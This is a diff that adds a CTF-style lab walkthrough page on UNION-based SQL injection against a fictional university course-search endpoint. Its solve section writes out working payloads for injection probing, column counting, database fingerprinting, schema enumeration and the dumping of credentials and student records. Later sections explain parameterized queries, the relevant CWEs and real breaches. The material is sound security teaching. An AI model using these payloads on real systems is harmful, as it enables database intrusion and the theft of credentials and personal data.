@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>level2@web — The Search Bar That Talks — D3CYPH3R Walkthroughs</title>
+  <meta name="description" content="Day three. The portal-svc credential from level1 (SSH-reused across hosts) lands you on the catalog host, where BluePier's 2021 course-search glues the query parameter straight into a SQL string. UNION-based SQL injection through a public, unauthenticated search box dumps the app's config table — th">
+  <link rel="canonical" href="https://www.d3cyph3r.com/walkthroughs/web/level2.html">
+  <meta property="og:title" content="level2@web — The Search Bar That Talks — D3CYPH3R Walkthroughs">
+  <meta property="og:description" content="Day three. The portal-svc credential from level1 (SSH-reused across hosts) lands you on the catalog host, where BluePier's 2021 course-search glues the query parameter straight into a SQL string. UNION-based SQL injection through a public, unauthenticated search box dumps the app's config table — th">
+  <meta property="og:url" content="https://www.d3cyph3r.com/walkthroughs/web/level2.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="D3CYPH3R">
+  <meta name="twitter:card" content="summary">
+  <meta name="theme-color" content="#0d1117">
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="stylesheet" href="/walkthroughs/walkthrough.css?v=2.4.0">
+</head>
+<body class="page-doc">
+
+  <a class="skip-link" href="#main">Skip to content</a>
+
+  <header id="site-header">
+    <div class="brand">
+      <a href="/" class="brand-mark-link" aria-label="Back to d3cyph3r.com">
+        <span class="brand-mark"><span class="glyph-bracket">[</span><span class="glyph-vt323 glyph-bright">D</span><span class="glyph-vt323 glyph-mid">3</span><span class="glyph-vt323 glyph-mid">C</span><span class="glyph-vt323 glyph-bright">Y</span><span class="glyph-vt323 glyph-dim">P</span><span class="glyph-vt323 glyph-mid">H</span><span class="glyph-vt323 glyph-dim">3</span><span class="glyph-vt323 glyph-bright">R</span><span class="glyph-bracket">]</span></span>
+      </a>
+      <a href="/walkthroughs/" class="brand-sub-link">
+        <span class="brand-sub">walkthroughs</span>
+      </a>
+    </div>
+    <nav id="crumbs" aria-label="Breadcrumb"><a href="/walkthroughs/">index</a><span class="sep" aria-hidden="true">/</span><a href="/walkthroughs/web/">web</a><span class="sep" aria-hidden="true">/</span><span class="current">level2</span></nav>
+    <button type="button" id="theme-toggle" class="theme-toggle" aria-label="Toggle light / dark theme" title="Toggle light / dark">
+      <svg class="theme-icon theme-icon-moon" width="14" height="14" viewBox="0 0 16 16" aria-hidden="true" fill="currentColor">
+        <path d="M6 .278a.77.77 0 0 1 .08.858 7.2 7.2 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.78.78 0 0 1 .81.316.73.73 0 0 1-.031.893A8.35 8.35 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.78.78 0 0 1 6 .278"/>
+      </svg>
+      <svg class="theme-icon theme-icon-sun" width="14" height="14" viewBox="0 0 16 16" aria-hidden="true" fill="currentColor">
+        <path d="M8 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8M8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0m0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13m8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5M3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8m10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0m-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0m9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707M4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708"/>
+      </svg>
+    </button>
+  </header>
+
+  <div class="layout">
+    <main id="main" class="doc">
+<h1 id="level2web-the-search-bar-that-talks">level2@web — The Search Bar That Talks<a class="anchor" href="#level2web-the-search-bar-that-talks" aria-label="Link to this section">#</a></h1>
+<p class="doc-meta"><span class="doc-meta-item">25 min read</span><span class="doc-meta-sep" aria-hidden="true">&middot;</span><span class="doc-meta-item">5,064 words</span><span class="doc-meta-sep" aria-hidden="true">&middot;</span><span class="doc-meta-item">Web track</span></p><details class="toc-mobile"><summary>On this page</summary><ul class="toc-list"><li><a href="#setup"><span class="toc-ord">§1</span><span class="toc-label">The setup</span></a></li><li><a href="#solve"><span class="toc-ord">§2</span><span class="toc-label">The solve</span></a></li><li><a href="#vulnerability"><span class="toc-ord">§3</span><span class="toc-label">The vulnerability</span></a></li><li><a href="#real-world-parallels"><span class="toc-ord">§4</span><span class="toc-label">Real-world parallels</span></a></li><li><a href="#frameworks"><span class="toc-ord">§5</span><span class="toc-label">Frameworks</span></a></li><li><a href="#certifications"><span class="toc-ord">§6</span><span class="toc-label">Cert exam relevance</span></a></li><li><a href="#defender"><span class="toc-ord">§7</span><span class="toc-label">What a defender does</span></a></li><li><a href="#optional-exploration"><span class="toc-ord">§7.5</span><span class="toc-label">Optional exploration</span></a></li><li><a href="#takeaways"><span class="toc-ord">§8</span><span class="toc-label">Key takeaways</span></a></li><li><a href="#further-reading"><span class="toc-ord">§9</span><span class="toc-label">Further reading</span></a></li></ul></details><p><strong>Track:</strong> Web · <strong>Client:</strong> Meridian State University (continued) · <strong>Compliance regime:</strong> FERPA (20 U.S.C. § 1232g; 34 CFR Part 99)</p>
+<blockquote class="spoiler-warning">
+<p>⚠ This page contains the full solve path <strong>and</strong> the breadcrumb credential for a future <code>level3@web</code>. If you haven&#39;t solved <code>level2@web</code> yet, close this tab and come back after — the puzzle is much more satisfying without spoilers. This walkthrough assumes you&#39;ve worked through <code>level0@web</code> and <code>level1@web</code>; it continues their narrative directly.</p>
+</blockquote>
+<hr>
+<h2 id="setup">§1 — The setup<a class="anchor" href="#setup" aria-label="Link to this section">#</a></h2>
+<p>Day three at Meridian State University. The level1 finding — Carlos&#39;s transcript endpoint handing out any student&#39;s record to any logged-in user (an IDOR / CWE-639) — closed the same afternoon. Carlos shipped the one-line ownership check, deleted the BluePier-era demo account that had been leaking a service credential through its <code>advisor_notes</code> field, and self-reported to Cedarwood Mutual (the cyber-insurance carrier) before Priya finished drafting the language. Two findings in two days, both remediated inside the audit window. Carlos is the easiest client Driftwood has.</p>
+<p>While cleaning up the demo account, Carlos recovered the service credential it had been leaking — <code>portal-svc</code> / <code>meridian-portal-svc-2026</code> — and, on a hunch, checked the catalog webapp host. The same key was sitting in that host&#39;s <code>authorized_keys</code>. BluePier had wired one service account across multiple hosts back in 2021 and nobody ever pulled it apart. That credential reuse is the third finding of the engagement; note it for the writeup. It&#39;s also how you get a shell on the catalog host:</p>
+<pre><code>guest@d3cyph3r:~$ ssh level2@web
+level2@web&#39;s password: meridian-portal-svc-2026
+</code></pre>
+<p>The prompt now reads <code>portal-svc@web:~$</code> — the lore host is <code>catalog.meridian.edu</code>. Today&#39;s target is the one piece of BluePier&#39;s 2021 work Carlos never rewrote: the public course-catalog search. It&#39;s the box prospective students use to browse Meridian&#39;s course list — no login required, and that part is correct. Course catalogs are public information. What&#39;s not correct is what BluePier did with the search term once it reached the server.</p>
+<p>Priya, with Meridian&#39;s general counsel cc&#39;d again, wants to know exactly how far that search box reaches. Her rules of engagement (in <code>priya-note.md</code>) are the same FERPA discipline as day two, with one sharpened edge:</p>
+<blockquote>
+<p><em>&quot;PROVE the vulnerability; do not harvest. Pull enough rows to demonstrate reach — a handful — and stop. Do NOT dump the full students table. &#39;I extracted 30,000 student records to prove a point&#39; is not a sentence that survives a deposition. The cleanest proof is the app&#39;s OWN secrets — the config table — because it shows an attacker could seize the whole database without touching a single student record first. Lead the writeup with that.&quot;</em></p>
+</blockquote>
+<p>That&#39;s the scope: confirm injection, find the column count, enumerate the schema, dump the application&#39;s configuration table, and extract the credential that proves the blast radius — without harvesting student PII to do it.</p>
+<p>Cross-track foreshadowing: the forensics track built a read-only SQLite query engine in <code>level2@forensics</code> (the <code>sqlite3</code> command) to <em>defend</em> — reconstructing what a suspect&#39;s browser did from on-disk databases. This level uses the same kind of SQL execution turned <em>offensive</em>: <code>curl</code> substitutes your input into the catalog&#39;s query and runs it for real. Same primitive, both sides of the table. And the prize — a production database credential sitting in plaintext in an application table — is the same &quot;secret stored in the wrong place&quot; antipattern that drove crypto&#39;s repo-committed hashes and cloud&#39;s migration-table credential. Different cause, same blast-radius math.</p>
+<h2 id="solve">§2 — The solve<a class="anchor" href="#solve" aria-label="Link to this section">#</a></h2>
+<p>The discipline this level teaches is patience with a methodology. SQL injection is not one trick; it&#39;s a sequence — probe, confirm, count columns, fingerprint, enumerate, extract — and each step earns the next. A tool like <code>sqlmap</code> automates the entire sequence in one command. Doing it by hand once is how you understand what the tool is doing, and why a single bound parameter on the server side would have made the whole thing a 404.</p>
+<p>Every command quotes the whole URL so the shell doesn&#39;t split the spaces and quotes in the payload.</p>
+<h3 id="step-1-use-the-breadcrumb-to-enter-the-box">Step 1: Use the breadcrumb to enter the box<a class="anchor" href="#step-1-use-the-breadcrumb-to-enter-the-box" aria-label="Link to this section">#</a></h3>
+<pre><code class="language-bash">guest@d3cyph3r:~$ ssh level2@web
+level2@web&#39;s password: meridian-portal-svc-2026
+</code></pre>
+<p>The password is the <code>portal-svc</code> credential BluePier stashed in the M-0000001 demo account, recovered when Carlos decommissioned it after yesterday&#39;s IDOR finding. The same key turned out to be in the catalog host&#39;s <code>authorized_keys</code> — credential reuse across hosts, a finding in its own right. The connection banner identifies the host (<code>catalog.meridian.edu</code>) and the tier (Routine, ~22 min). Read <code>welcome.md</code> first — it explains what SQL injection is and lays out the order of operations.</p>
+<h3 id="step-2-read-the-brief-and-the-vulnerable-source">Step 2: Read the brief and the vulnerable source<a class="anchor" href="#step-2-read-the-brief-and-the-vulnerable-source" aria-label="Link to this section">#</a></h3>
+<pre><code class="language-bash">portal-svc@web:~$ cat priya-note.md
+portal-svc@web:~$ cat catalog-search.js
+portal-svc@web:~$ cat deploy-notes.md
+</code></pre>
+<p><code>priya-note.md</code> carries the rules of engagement above. <code>catalog-search.js</code> is the handler BluePier shipped — fifteen lines, and the vulnerability is one of them:</p>
+<pre><code class="language-javascript">router.get(&quot;/api/search&quot;, async (req, res) =&gt; {
+  const q = req.query.q || &quot;&quot;;
+
+  // BluePier built the query by gluing the search term straight into
+  // the SQL string. The term is NOT escaped or bound as a parameter.
+  //   &gt;&gt;&gt;  this is the vulnerability  &lt;&lt;&lt;
+  const sql =
+    &quot;SELECT sku, title, dept, credits FROM courses &quot; +
+    &quot;WHERE title LIKE &#39;%&quot; + q + &quot;%&#39;&quot;;
+  ...
+</code></pre>
+<p>The <code>&quot;...&quot; + q + &quot;...&quot;</code> concatenation is the entire bug. The search term <code>q</code> is glued into the middle of a string literal in the SQL. Whatever characters <code>q</code> contains become part of the query. The <code>catch</code> block at the bottom of the handler returns the raw database error and the constructed <code>sql</code> string to the client — a second finding (CWE-209) you&#39;ll see fire in a moment.</p>
+<p><code>deploy-notes.md</code> is the most important file you&#39;ll read. It establishes the blast radius before you&#39;ve sent a single request:</p>
+<ul>
+<li>The catalog connects to the <strong>same database</strong> as the student portal (<code>meridian_portal</code>), as a user (<code>meridian_app</code>) granted <strong>read/write on the entire schema</strong> — including the <code>students</code> and <code>staff_users</code> tables.</li>
+<li>The catalog subdomain is <strong>not</strong> behind the Cloudflare WAF that fronts <code>www.meridian.edu</code>. There is <strong>no WAF and no rate limiting</strong> on <code>/api/search</code> (this is a bonus find).</li>
+<li>The database is <strong>MySQL 5.7.38</strong>, which reached <a href="https://endoflife.date/mysql" target="_blank" rel="noopener noreferrer">end-of-life on October 31, 2023</a> — no security patches since.</li>
+</ul>
+<h3 id="step-3-watch-the-endpoint-behave-normally">Step 3: Watch the endpoint behave normally<a class="anchor" href="#step-3-watch-the-endpoint-behave-normally" aria-label="Link to this section">#</a></h3>
+<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=biology&quot;
+{
+  &quot;results&quot;: [
+    { &quot;sku&quot;: &quot;BIO-101&quot;, &quot;title&quot;: &quot;Introduction to Biology&quot;, &quot;dept&quot;: &quot;Biology&quot;, &quot;credits&quot;: 4 },
+    { &quot;sku&quot;: &quot;BIO-310&quot;, &quot;title&quot;: &quot;Cell Biology&quot;, &quot;dept&quot;: &quot;Biology&quot;, &quot;credits&quot;: 3 }
+  ],
+  &quot;count&quot;: 2
+}
+</code></pre>
+<p>A normal search returns matching courses as JSON. The app renders every row under the column names <code>sku</code>, <code>title</code>, <code>dept</code>, <code>credits</code>. Remember those four columns — UNION-based extraction has to match them.</p>
+<h3 id="step-4-probe-with-a-single-quote-cwe-209-bonus">Step 4: Probe with a single quote (CWE-209 bonus)<a class="anchor" href="#step-4-probe-with-a-single-quote-cwe-209-bonus" aria-label="Link to this section">#</a></h3>
+<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=&#39;&quot;
+{
+  &quot;status&quot;: &quot;error&quot;,
+  &quot;message&quot;: &quot;Database query failed&quot;,
+  &quot;error&quot;: &quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;%&#39;&#39; at line 1&quot;,
+  &quot;query&quot;: &quot;SELECT sku, title, dept, credits FROM courses WHERE title LIKE &#39;%&#39;%&#39;&quot;
+}
+
+  ✦ Bonus find unlocked: Verbose database errors in production
+</code></pre>
+<p>This single response is two findings. <strong>First:</strong> the endpoint is injectable — a lone <code>&#39;</code> produced a syntax error, which means your input is reaching the SQL parser as code, not data. <strong>Second:</strong> the application leaked the raw database error <em>and the exact query it built</em> straight to the HTTP response. That&#39;s CWE-209 (Generation of Error Message Containing Sensitive Information), and it turns blind trial-and-error into a guided exercise: you now know the backend is MySQL, you can see the query template, and you can read your own injection back to develop the payload. The bonus banner fires on this response.</p>
+<h3 id="step-5-confirm-with-a-tautology">Step 5: Confirm with a tautology<a class="anchor" href="#step-5-confirm-with-a-tautology" aria-label="Link to this section">#</a></h3>
+<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=&#39; OR 1=1-- -&quot;
+{ &quot;results&quot;: [ ...every course in the catalog... ], &quot;count&quot;: 8 }
+</code></pre>
+<p>The payload closes the string literal (<code>&#39;</code>), adds a condition that&#39;s always true (<code>OR 1=1</code>), and comments out the rest of BluePier&#39;s query (<code>-- -</code>). The constructed query becomes <code>... WHERE title LIKE &#39;%&#39; OR 1=1</code> and every course returns. Injection confirmed.</p>
+<p>A note on <code>-- -</code>: in MySQL, <code>--</code> only starts a comment when it&#39;s followed by whitespace or end-of-line. The trailing <code>-</code> after the space is the conventional way to make that required space visible and intentional — <code>-- </code> (with a trailing space) works too, but the dash makes it obvious you meant it. <code>#</code> also works as a MySQL comment.</p>
+<h3 id="step-6-count-the-columns">Step 6: Count the columns<a class="anchor" href="#step-6-count-the-columns" aria-label="Link to this section">#</a></h3>
+<p>A UNION can only join two SELECTs that return the <em>same number of columns</em>. You don&#39;t know the count yet from the outside (the source confirmed four, but you&#39;d determine it blind in a real engagement). Two techniques:</p>
+<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; ORDER BY 4-- -&quot;
+{ &quot;results&quot;: [], &quot;count&quot;: 0 }
+
+portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; ORDER BY 5-- -&quot;
+{ &quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Database query failed&quot;,
+  &quot;error&quot;: &quot;Unknown column &#39;5&#39; in &#39;order clause&#39;&quot;, ... }
+</code></pre>
+<p><code>ORDER BY 4</code> is accepted; <code>ORDER BY 5</code> errors with <em>&quot;Unknown column &#39;5&#39; in &#39;order clause&#39;&quot;</em>. The query has four columns. (<code>zzz</code> is a search term that matches no course, so the only rows you see are the ones you inject — cleaner output.) You can confirm the same count with <code>UNION SELECT NULL,NULL,NULL,NULL-- -</code> (accepted) versus three NULLs (errors with <em>&quot;The used SELECT statements have a different number of columns&quot;</em>).</p>
+<h3 id="step-7-fingerprint-the-database">Step 7: Fingerprint the database<a class="anchor" href="#step-7-fingerprint-the-database" aria-label="Link to this section">#</a></h3>
+<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT @@version,user(),database(),NULL-- -&quot;
+{
+  &quot;results&quot;: [
+    { &quot;sku&quot;: &quot;5.7.38-0ubuntu0.18.04.1&quot;, &quot;title&quot;: &quot;meridian_app@localhost&quot;, &quot;dept&quot;: &quot;meridian_portal&quot;, &quot;credits&quot;: null }
+  ],
+  &quot;count&quot;: 1
+}
+</code></pre>
+<p>The injected row surfaces in the app&#39;s normal output slots: <code>@@version</code> lands in <code>sku</code>, <code>user()</code> in <code>title</code>, <code>database()</code> in <code>dept</code>. You now have the exact server version (MySQL 5.7.38 — the EOL build the deploy notes mentioned), the database user the app connects as (<code>meridian_app</code>), and the current schema (<code>meridian_portal</code>). This is the moment &quot;injected data surfaces where the page expected course data&quot; clicks.</p>
+<h3 id="step-8-enumerate-the-schema-via-information-schema">Step 8: Enumerate the schema via information_schema<a class="anchor" href="#step-8-enumerate-the-schema-via-information-schema" aria-label="Link to this section">#</a></h3>
+<p><code>information_schema</code> is SQL&#39;s own catalog — a set of virtual tables describing every other table. It&#39;s how you map a database you can&#39;t see:</p>
+<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -&quot;
+{
+  &quot;results&quot;: [
+    { &quot;sku&quot;: &quot;courses&quot;, ... },
+    { &quot;sku&quot;: &quot;students&quot;, ... },
+    { &quot;sku&quot;: &quot;staff_users&quot;, ... },
+    { &quot;sku&quot;: &quot;app_config&quot;, ... }
+  ],
+  &quot;count&quot;: 4
+}
+</code></pre>
+<p>Four tables. <code>courses</code> is the one the search was meant to read. <code>students</code> is FERPA-protected records. <code>staff_users</code> is the auth table. <code>app_config</code> looks like configuration — and configuration is where credentials hide. List its columns:</p>
+<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name=&#39;app_config&#39;-- -&quot;
+{ &quot;results&quot;: [ { &quot;sku&quot;: &quot;config_key&quot;, ... }, { &quot;sku&quot;: &quot;config_value&quot;, ... } ], &quot;count&quot;: 2 }
+</code></pre>
+<p>A simple key/value table.</p>
+<h3 id="step-9-dump-app-config-the-credential-the-level3-breadcrumb">Step 9: Dump app_config — the credential (the level3 breadcrumb)<a class="anchor" href="#step-9-dump-app-config-the-credential-the-level3-breadcrumb" aria-label="Link to this section">#</a></h3>
+<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT config_key,config_value,NULL,NULL FROM app_config-- -&quot;
+{
+  &quot;results&quot;: [
+    { &quot;sku&quot;: &quot;app.name&quot;,          &quot;title&quot;: &quot;Meridian Course Catalog&quot;,         ... },
+    { &quot;sku&quot;: &quot;smtp.host&quot;,         &quot;title&quot;: &quot;smtp.meridian.edu&quot;,                ... },
+    { &quot;sku&quot;: &quot;smtp.user&quot;,         &quot;title&quot;: &quot;noreply@meridian.edu&quot;,             ... },
+    { &quot;sku&quot;: &quot;session.secret&quot;,    &quot;title&quot;: &quot;kg9F2pX7qZ1mW4dR6tY8-rotate-me&quot;,   ... },
+    { &quot;sku&quot;: &quot;db.host&quot;,           &quot;title&quot;: &quot;db.meridian.edu&quot;,                  ... },
+    { &quot;sku&quot;: &quot;db.admin.user&quot;,     &quot;title&quot;: &quot;meridian_dbadmin&quot;,                 ... },
+    { &quot;sku&quot;: &quot;db.admin.password&quot;, &quot;title&quot;: &quot;M3rid14n-DBr00t!2026&quot;,             ... },
+    { &quot;sku&quot;: &quot;recaptcha.secret&quot;,  &quot;title&quot;: &quot;6Lc2k9wpAAAAAB-meridian-prod&quot;,     ... }
+  ],
+  &quot;count&quot;: 8
+}
+</code></pre>
+<p>There it is. <code>db.admin.password</code> = <strong><code>M3rid14n-DBr00t!2026</code></strong>, the password for <code>meridian_dbadmin</code> — the database&#39;s administrative account, stored in plaintext in a database table. This is the prize Priya asked you to lead with: you reached the database&#39;s own superuser credential through a public, unauthenticated search box, without touching a single student record. With that credential an attacker owns the entire <code>meridian_portal</code> database — every transcript, every grade, every record. It&#39;s also the breadcrumb to <code>level3@web</code>.</p>
+<h3 id="step-10-demonstrate-the-ferpa-blast-radius-then-stop">Step 10: Demonstrate the FERPA blast radius (then stop)<a class="anchor" href="#step-10-demonstrate-the-ferpa-blast-radius-then-stop" aria-label="Link to this section">#</a></h3>
+<p>To prove reach — a handful of rows, per the rules of engagement — the same injection pulls student records:</p>
+<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT student_id,full_name,email,gpa FROM students-- -&quot;
+{
+  &quot;results&quot;: [
+    { &quot;sku&quot;: &quot;M-1872941&quot;, &quot;title&quot;: &quot;Aisha Patel&quot;,  &quot;dept&quot;: &quot;patel.a@meridian.edu&quot;, &quot;credits&quot;: 3.91 },
+    { &quot;sku&quot;: &quot;M-1872995&quot;, &quot;title&quot;: &quot;Marcus Reyes&quot;, &quot;dept&quot;: &quot;reyes.m@meridian.edu&quot;, &quot;credits&quot;: 3.42 },
+    ...
+  ]
+}
+</code></pre>
+<p>Those are the same students from level0&#39;s exposed CSV — names, IDs, emails, GPAs, reachable from the open internet through a course search. Pull a handful, document it, and stop. (For contrast, dumping <code>staff_users</code> shows the staff passwords are bcrypt-hashed — <code>$2b$12$...</code> — so at least the auth table did it right. The plaintext DB-admin credential in <code>app_config</code> is the worse finding, and the point: even a well-hashed auth table doesn&#39;t matter when the database&#39;s master key is sitting in a config row.)</p>
+<h3 id="step-11-return-to-the-lobby-with-the-finding">Step 11: Return to the lobby with the finding<a class="anchor" href="#step-11-return-to-the-lobby-with-the-finding" aria-label="Link to this section">#</a></h3>
+<pre><code class="language-bash">portal-svc@web:~$ exit
+</code></pre>
+<p>The deliverable is short and damning: a public, unauthenticated endpoint sharing a database with the student-records system; injection confirmed; the application&#39;s own database-admin credential extracted in plaintext; every FERPA-protected record reachable. The fix is one line (parameterize the query) plus four follow-ons (scope the DB account, stop leaking errors, rotate the credential, put the subdomain behind the WAF). Cedarwood Mutual needs it today.</p>
+<h2 id="vulnerability">§3 — The vulnerability<a class="anchor" href="#vulnerability" aria-label="Link to this section">#</a></h2>
+<p>The lesson in one sentence: <strong>when an application builds a query by gluing untrusted input into the query string, the input stops being data and becomes code.</strong></p>
+<p>The safe pattern keeps input and code separate by passing the input as a bound parameter:</p>
+<pre><code class="language-javascript">const sql = &quot;SELECT sku, title, dept, credits FROM courses WHERE title LIKE ?&quot;;
+const rows = await db.query(sql, [&#39;%&#39; + q + &#39;%&#39;]);
+</code></pre>
+<p>The <code>?</code> is a placeholder. The database driver sends the query template and the parameter values over the wire <em>separately</em>; the value is never parsed as SQL. A single quote in the parameter stays a single quote — it can never close a string literal or introduce a keyword, because by the time it reaches the database, the query&#39;s structure is already fixed. This is &quot;parameterized queries&quot; / &quot;prepared statements,&quot; and it is the complete fix. Not input sanitization, not escaping, not a denylist of bad words — parameterization, which makes the class of bug structurally impossible.</p>
+<p>BluePier&#39;s handler did the opposite — string concatenation — and three failures stacked on top of it:</p>
+<p><strong>Failure one — string-concatenated SQL (CWE-89).</strong> The root cause. <code>&quot;...LIKE &#39;%&quot; + q + &quot;%&#39;&quot;</code>. Everything in §2 follows from this one line. It is the single most-documented web vulnerability in history, on the OWASP Top 10 in some form since the list&#39;s inception.</p>
+<p><strong>Failure two — verbose errors in production (CWE-209).</strong> The handler&#39;s <code>catch</code> block returned the raw DB error and the constructed query to the client. That hands an attacker the backend identity, the query shape, and a live feedback loop for payload development. Error detail belongs in server-side logs; clients get a generic &quot;something went wrong.&quot;</p>
+<p><strong>Failure three — an over-privileged, shared database account (CWE-250).</strong> The public catalog connects with a user that can read every table in the portal schema, including FERPA records. A read-only account scoped to <code>courses</code> would have turned a catastrophic injection into a nuisance — you&#39;d have broken the query and reached nothing worth reaching. Least privilege is the difference between &quot;one table leaked&quot; and &quot;the whole institution leaked.&quot;</p>
+<p>And the prize compounds a fourth: <strong>the DB-admin credential stored in plaintext in a database table (CWE-312 / CWE-522).</strong> Credentials belong in a secrets manager, never in a row an injection can read.</p>
+<p>A note on the threat landscape. In the <a href="https://owasp.org/Top10/" target="_blank" rel="noopener noreferrer">OWASP Top 10:2025</a>, Injection sits at <strong>A05</strong> — it dropped from A03:2021 (and from #1 in the 2013/2017 editions). That decline is real and it&#39;s good news: parameterized queries and ORMs are now the framework default, so classic SQLi is genuinely less common than it was a decade ago. But &quot;less common&quot; is not &quot;gone,&quot; and when it lands the impact is total — as MOVEit (§4) demonstrated in 2023. Meridian&#39;s catalog is exactly the kind of code that slips through: a 2021 hand-built query, inherited and never rewritten, on a subdomain nobody re-reviewed.</p>
+<h2 id="real-world-parallels">§4 — Real-world parallels<a class="anchor" href="#real-world-parallels" aria-label="Link to this section">#</a></h2>
+<p><strong>Heartland Payment Systems, 2008.</strong> The Albert Gonzalez crew — the same group behind the TJX and 7-Eleven breaches — used SQL injection to plant backdoors on corporate networks and pivot to payment systems, where they installed packet sniffers. Heartland was among the targets; roughly 130 million card numbers were exposed, one of the largest payment breaches of its era. The lesson Meridian&#39;s catalog repeats: the injectable endpoint is rarely the valuable target itself — it&#39;s the doorway to the network behind it. <a href="https://en.wikipedia.org/wiki/Albert_Gonzalez" target="_blank" rel="noopener noreferrer">Wikipedia on Albert Gonzalez</a> documents the SQL-injection methodology; <a href="https://en.wikipedia.org/wiki/Heartland_Payment_Systems#Security_breach" target="_blank" rel="noopener noreferrer">the Heartland breach article</a> carries the scope.</p>
+<p><strong>Sony Pictures, 2011 (LulzSec).</strong> LulzSec used a single SQL injection against a Sony Pictures web property to extract users&#39; names, passwords, email and home addresses, and dates of birth. It&#39;s the canonical example of a public web form with an unparameterized query behind it — one injectable parameter, the whole user table. <a href="https://en.wikipedia.org/wiki/LulzSec" target="_blank" rel="noopener noreferrer">Wikipedia&#39;s LulzSec article</a> documents the incident.</p>
+<p><strong>TalkTalk, 2015.</strong> The UK telecom TalkTalk suffered a SQL injection breach exposing the personal data of over 156,000 customers. The UK Information Commissioner&#39;s Office fined TalkTalk £400,000 — at the time a record — stressing that the attack exploited a SQL-injection flaw &quot;well understood for more than ten years,&quot; on an out-of-date database, that known defences would have stopped. This is the regulatory parallel for Meridian: TalkTalk&#39;s fine came not just from the breach but from the <em>preventability</em> — the same framing FERPA and Cedarwood Mutual will apply. The <a href="https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-ico-investigation-unfolded/" target="_blank" rel="noopener noreferrer">ICO&#39;s account of the investigation</a> is the primary source.</p>
+<p><strong>MOVEit Transfer, 2023 (CVE-2023-34362).</strong> The most consequential proof that SQL injection is not a solved problem: the Cl0p ransomware group exploited a SQL injection vulnerability in Progress Software&#39;s MOVEit Transfer file-transfer product to steal data from <em>thousands</em> of organizations — government agencies, universities, pension funds, corporations — affecting tens of millions of individuals. It was a textbook SQLi (untrusted input into a query) in widely-deployed enterprise software, in 2023. CISA issued an advisory; <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34362" target="_blank" rel="noopener noreferrer">the NVD entry for CVE-2023-34362</a> and the <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a" target="_blank" rel="noopener noreferrer">CISA advisory AA23-158A</a> are the authoritative references. When OWASP says injection &quot;dropped to A05 but stays on the list because the impact is total,&quot; MOVEit is the case they mean.</p>
+<p>The through-line across all four: SQL injection&#39;s prevalence has fallen, but its blast radius has not. Every one of these started with a single endpoint that glued user input into a query.</p>
+<h2 id="frameworks">§5 — Frameworks, deep dive<a class="anchor" href="#frameworks" aria-label="Link to this section">#</a></h2>
+<p><strong>CWE-89: Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;).</strong> The surgical CWE. It was <strong>#3 on the CWE Top 25 Most Dangerous Software Weaknesses in both 2023 and 2024</strong>. The catalog entry&#39;s primary mitigation is unambiguous: use a parameterized query API (&quot;prepared statements&quot;), and treat input validation as a secondary defense, never the primary one. (<a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener noreferrer">MITRE CWE-89</a>)</p>
+<p><strong>CWE-209: Generation of Error Message Containing Sensitive Information.</strong> The verbose error that returned the raw query and the DB version. The catalog entry recommends generic client-facing error messages with detail logged server-side only. (<a href="https://cwe.mitre.org/data/definitions/209.html" target="_blank" rel="noopener noreferrer">MITRE CWE-209</a>)</p>
+<p><strong>CWE-250: Execution with Unnecessary Privileges.</strong> The public catalog connecting as a user with read/write on the entire schema. A read-only account scoped to <code>courses</code> is the least-privilege fix. (<a href="https://cwe.mitre.org/data/definitions/250.html" target="_blank" rel="noopener noreferrer">MITRE CWE-250</a>)</p>
